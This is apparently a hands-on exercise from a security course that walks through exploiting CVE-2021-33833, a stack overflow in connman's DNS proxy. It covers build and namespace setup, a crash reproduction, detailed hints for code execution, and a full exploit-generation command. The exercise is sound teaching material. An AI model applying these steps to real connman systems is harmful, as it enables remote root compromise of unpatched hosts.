A Real Stack Overflow Vulnerability in the connman network manager
==================================================================

This was a vulnerability handled in [bnc#1186869][1], CVE-2021-33833.

[1]: https://bugzilla.suse.com/show_bug.cgi?id=1186869

Connman is a network manager service similar to NetworkManager but with a
newer codebase supported by Intel. The vulnerability is in the DNS proxy
component that connman is running by default. A malicious remote DNS server
can attack _connmand_ running as root.

This is a more complex scenario, because we need to understand a bit about the
DNS protocol and also the vulnerable code section is pretty complex. Also the
test setup is more complex, because we don't really want to mess with our
host's network configuration or let a vulnerable _connmand_ listen to a live
network.

The upstream repo is at [kernel.org][2]. Version 1.39 still contains the
vulnerability, so `git checkout 1.39` will get you the code you need.

[2]: https://git.kernel.org/pub/scm/network/connman/connman.git

Building connman
----------------

NOTE: to perform this exercise your test system *must not* use connman itself
for network configuration, otherwise the test _connmand_ and the real
_connmand_ will conflict with each other.

```sh
# Install required dependencies for building connman
$ sudo zypper in glib2-devel dbus-1-devel libxtables-devel libmnl-devel libgnutls-devel readline-devel

# Safety check that the system isn't already running connmand in production
$ pgrep connmand >/dev/null && echo "This system already uses connman. This will not work"

# Clone the upstream repository
$ git clone https://git.kernel.org/pub/scm/network/connman/connman.git

$ cd connman

# Checkout the most recent vulnerable version
$ git checkout 1.39

# Generate the build system scripts (autotools)
$ ./bootstrap

# prepare an out-of-tree build
$ mkdir ../build
$ cd ../build

# We want to install connman locally into an isolated prefix as a regular user.
# We need to specify a couple of install directories explicitly for this to work.
# We will use this $INSTDIR shell variable to refer to the local installation
# dir. This variable is also used by some helper scripts later on.
$ export INSTDIR="$PWD/../install"
$ CFLAGS="-O2 -g -fno-stack-protector" ../connman/configure --prefix="$INSTDIR" \
	--with-dbusconfdir="$INSTDIR/share" \
	--with-dbusdatadir="$INSTDIR/share" \
	--with-tmpfilesdir="$INSTDIR/lib/tmpfiles.d" \
	--with-systemdunitdir="$INSTDIR/share/system.d"
$ make
$ make install

# Mark the installed binary to get an executable stack
$ execstack -s ../install/sbin/connmand

# Modify the installed connman D-Bus configuration to allow the unprivileged user
# to register the connmand interface
$ DBUSCONF="$INSTDIR/share/dbus-1/system.d/connman.conf"
$ sed -i "s/user=\"root\"/user=\"$USER\"/g" $DBUSCONF

# Install the D-Bus configuration into the system
# NOTE: this is the only permanent system change for the connman setup, so if
# you want to clean up later on you should remove this file vom /etc again
$ sudo install -o root -g root -m 0644 "$DBUSCONF" /etc/dbus-1/system.d/

# configure connmand not to perform an online check to consider an interface
# on-line
$ mkdir -p "$INSTDIR/etc/connman"
$ echo -e "[General]\nEnableOnlineCheck = false\n" >"$INSTDIR/etc/connman/main.conf"

# also create some directories connman expects to exist
$ mkdir -p "$INSTDIR/var/lib/connman"
$ mkdir -p "$INSTDIR/var/run/connmand"

# create a simple configuration file in the example directory to allow scripts
# to find the correct $INSTDIR location.
$ cd ../examples/connman_dns
$ echo "$INSTDIR" >instdir.conf
```

Running connman
===============

We don't want to run connman as root, especially not this vulnerable version.
By default connman attempts to reconfigure each Ethernet interface using DHCP.
That would mess up our system. Connman is pretty stubborn in its
prerequisites. It is not able to run without network administration privileges
or without D-Bus communication. To overcome this, a helper script
`enter_namespace.py` is part of this exercise. This script will employ
container techniques to split off a separate network namespace i.e. a
completely new network stack that is not connected to the host's network
stack. Within this namespace _connmand_ will have full privileges to do what
it wants to do.

You can open multiple shells inside this forked network namespace by calling
`enter_namespace.py`. The first shell will create the new namespace, then the
following shells will join it. You need to keep the first shell open for this
to work, however. Note that this script also requires the environment
variable `$INSTDIR` from the build section above to be correctly set within
the `instdir.conf` file as explained in the previous section.

Look around inside the forked namespace e.g. by calling `ip link` to notice
that there is only a loopback network device visible anymore. Because
_connmand_ needs *some* non-loopback device to manage, we create a dummy
device like this:

    $ ./enter_namespace.py
    [...]
    (network-ns) $ ip link add fake0 type dummy

This will give us a dummy Ethernet device named "fake0". It is connected to
nothing, but _connmand_ can use it as any other Ethernet device, send out DHCP
requests and configure IP addresses on it.

With this prepared we can now launch _connmand_ itself:

    (network-ns) $ $INSTDIR/sbin/connmand -n -i fake0

The `-n` parameter is important to keep the daemon running the foreground. In
another shell we now can start the client part of Connman called connmanctl:

    (network-ns) $ $INSTDIR/bin/connmanctl
    connmanctl> services
    *Ac Wired                ethernet_12691abf9fe9_cable

As shown above the output of the `services` command should show us an entry
for the "fake0" ethernet device we created.

All further exploit activities have to happen within this forked namespace
i.e. in a shell created via `enter_namespace.py`.

Exploiting the Issue
====================

Since the security issue is in the DNS reverse proxy code of _connmand_ and
can only be triggered from the remote DNS server side, we need to be able to
act as a remote DNS server locally. Connman's DNS reverse proxy listens on
localhost:53 and forwards DNS requests to whatever DNS server is configured.
We therefore use the "fake0" Ethernet device to have a "remote" DNS server
listening on it.

Configure the "fake0" connection using connmanctl like this (you need to
replace the name of the connection with the name you have in your setup, you
can use `<TAB>` to auto-complete it).

    (network-ns) $ $INSTDIR/bin/connmanctl
    connmanctl> config ethernet_12691abf9fe9_cable --ipv4 manual 192.168.1.1 255.255.255.0
    connmanctl> config ethernet_12691abf9fe9_cable --nameservers 192.168.1.1
    connmanctl> config ethernet_12691abf9fe9_cable --domains fake.com

The `--domains` part is also important, because the security issue can only be
triggered when the fully-qualified domain name logic in the DNS reverse proxy
is involved.

Another script that is part of this example implements a small part of the DNS
internet procotol to allow acting as the "remote" DNS server. If you are
interested in the details of it then have a look at the [RFC][3]. The overflow
can be triggered via overly long answer records like described in the RFC in
section 3.2.1, 3.2.2, 3.2.4 and 3.4.1 (for an IPv4 address reply which we will
use in our exploit).

[3]: https://datatracker.ietf.org/doc/html/rfc1035

The script is called `connexec.py`. We let it listen on the IP address that is
now assigned to the "fake0" ethernet device. Therefore in a third shell do:

    network-ns: ./connexec.py -l 192.168.1.1

In this mode `connexec.py` simply replies with a result of a single IPv4
address 255.255.255.255 (which is nonsense, of course). We use this mode just
to test whether our DNS reverse proxy setup is acting as intended. For this we
use a fourth shell:

    network-ns: host somwhere. 127.0.0.1
    Using domain server:
    Name: 127.0.0.1
    Address: 127.0.0.1#53
    Aliases:
    
    somehwere has address 255.255.255.255
    somehwere has address 255.255.255.255
    somehwere has address 255.255.255.255

This command explicitly contacts the DNS server running on localhost (the DNS
reverse proxy implemented in _connmand_) and asks it to resolve the hostname
"somewhere.". The dot suffix is important, because it triggers the DNS reverse
proxy's domain name qualification logic that contains the security issue. As
we can see from the output, the setup has worked and the reply with IPv4
address 255.255.255.255 from the `connexec.py` script has reached our DNS
client.

For sending an actual exploit payload we can pass arbitrary data via the
`--exploit` switch of `connexec.py`. Instead of a harmless reply with an IP
address the script will then return the arbitrary data that will overwrite the
stack buffer. The following _connexec.py_ setup should cause _connmand_
to simply crash once the DNS query from above is triggered:

    # shell A (DNS server)
    (network-ns) $ dd if=/dev/urandom of=./garbage.raw bs=2048 count=1
    (network-ns) $ ./connexec.py -l 192.168.1.1 -x garbage.raw

    # shell B (DNS client)
    (network-ns) $ host somehwere. 127.0.0.1

    # shell C (connmand)
    [...]
    connmand[18493]: Failed to find URL:http://ipv4.connman.net/online/status.html
    connmand[18493]: Aborting (signal 11) [/home/mgerstner/work/install/sbin/connmand]
    Segmentation fault (core dumped)

Thus we now achieved remote denial of service in _connmand_ but not yet remote
code execution.

---
**NOTE:**

Each time you restart `connmand` you will need to reconfigure it using
`connmanctl` as shown at the start of this section.

---

Achieving Full Code Execution
=============================

Once you reached this stage you can start constructing an actual attack
payload to achieve arbitrary code execution in _connmand_. You need to think
of the following aspects when doing so:

- _connmand_ not only needs to run in the forked off network namespace but
  also in a shell with address space randomization disabled. To do so run
  `make shell` in the example directory.
- The overflow happens in source file `dnsproxy.c:1849`. The target overflow
  buffer is found in the calling function `forward_dns_reply()`, however, in
  `dnsprocy.c:1990`: `char uncompressed[NS_MAXDNAME]`.
  The constant `NS_MAXDNAME` is found in system headers and is set to 1025
  bytes. This is the target buffer size we can use for placing our exploit.
- There are no restrictions as to which bytes can appear in the overflow data,
  because in `memcpy` there is no termination character like in the `strcpy`
  family functions. The length of the data is defined by the DNS message header
  field.  This means we don't need to take special precautions to avoid certain
  bytes in the attack payload.
- Given the large size of the buffer (1024 bytes) and no limits to the attack
  data a pretty large program could be executed. For our purposes we will
  use the simple 'execve' code snippet from the previous examples, however.
- There is a higher complexity with offsets in this example, because the
  start address of the payload that is copied from, is itself not necessarily
  aligned. You can use the `--padding-offset` parameter of the
  `gen_exploit.py` script to account for that. Try different exploit packets
  and look at the resulting overflow data, especially the return address in
  the stack frame and the address of the `uncompressed` buffer as well as the
  address of `uptr` when the overflow happens. You need to take into account
  that the overflow is triggered in the `uncompress()` function but the
  vulnerable buffer is in the `forward_dns_reply()` function. Thus the stack
  frame of `forward_dns_reply()` will be corrupted, not the stack frame of
  `uncompress()`.
- There is a sign extension problem (actually another bug in the networking
  code of the DNS proxy) in `dnsproxy.c:1842`. Here `char*` is used as type
  for the `uptr` pointer. `char` is a signed type on `x86_64` using GCC. Also
  the target variable `dlen` is a signed `int` type. This means that the bit
  operation `dlen = uptr[-2] << 8 | uptr[-1]` can become negative e.g. if
  `uptr[-1]` has the topmost bit set. You need to make sure that the length of
  the exploit buffer results in a bit representation where this negative sign
  extension does not occur, otherwise `memcpy` will be called with a negative
  length, resulting in an immediate segmentation fault.
- The exact start address of `uncompressed` is not a suitable return address,
  because the first couple of bytes return valid DNS protocol data. The first
  usable return address will be a higher memory address. Inspect the process
  memory after the overflow happens to understand this better.

Solution
--------

In my test setup using the exact command stated here (this means also the same
hostname `somewhere.` and domain `fake.com` to resolve) the following command
line generates the proper exploit that achieves full code execution:

    ./gen_exploit.py -c ../code_injection/execve.bin -e 1600 -s 1000 --padding-offset 4 -o -a 0x7fffffffc9b0 >exploit.bin

Of course you still need to fill in a suitable address for the `uncompressed`
buffer as is the case for your runtime session.

Extra Exercises
===============

- In the setup proposed above we compiled _connmand_ with optimizations
  (compiler flag `-O2`). On `x86_64` this causes nearly all primitive
  variables in the functions `forward_dns_reply()` and `uncompress()` to be
  placed into registers. What would be different if these variables would be
  placed on the stack instead? How would this influence the success chances
  for achieving full code execution? Could it offer other attack vectors
  instead?
- In a real environment _connmand_ would be executed as a systemd service that
  has additional hardenings like `ProtectSystem=full`. How could arbitrary
  code execution still proof harmful in this case?
